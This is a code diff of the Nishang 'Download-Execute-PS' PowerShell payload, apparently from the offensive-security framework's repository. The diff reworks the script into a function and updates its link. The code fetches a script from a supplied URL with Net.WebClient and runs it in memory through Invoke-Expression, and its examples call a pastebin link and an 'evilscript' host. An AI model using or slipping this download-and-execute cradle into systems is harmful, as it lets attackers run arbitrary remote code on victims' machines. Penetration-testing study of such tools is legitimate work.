@@ -1,4 +1,4 @@
-﻿
+
 <#
 .SYNOPSIS
 Nishang Payload which downloads and executes a powershell script.
@@ -10,27 +10,34 @@ This payload downloads a powershell script from specified URL and then executes 
 The URL from where the powershell script would be downloaded.
 
 .EXAMPLE
-PS > .\Download-Execute-PS.ps1 http://pastebin.com/raw.php?i=jqP2vJ3x
+PS > Download-Execute-PS http://pastebin.com/raw.php?i=jqP2vJ3x
 
 .EXAMPLE
-PS > .\Download-Execute-PS.ps1 http://script.alteredsecurity.com/evilscript -nodownload
+PS > Download-Execute-PS http://script.alteredsecurity.com/evilscript -nodownload
 The above command does not dowload the script file to disk.
 
 .LINK
 http://labofapenetrationtester.blogspot.com/
-http://code.google.com/p/nishang
+https://github.com/samratashok/nishang
 #>
 
 
 
-Param( [Parameter(Position = 0, Mandatory = $True)] [String] $ScriptURL,
-[Parameter(Position = 1)] [Switch] $nodownload)
 
 function Download-Execute-PS
 {
+    [CmdletBinding()] Param(
+        [Parameter(Position = 0, Mandatory = $True)]
+        [String]
+        $ScriptURL,
+
+        [Parameter(Position = 1)]
+        [Switch]
+        $nodownload
+    )
+
     if ($nodownload -eq $true)
     {
-        #Need more testing
         Invoke-Expression ((New-Object Net.WebClient).DownloadString("$ScriptURL"));
     }
     
@@ -44,5 +51,4 @@ function Download-Execute-PS
     }
 }
 
-Download-Execute-PS
 
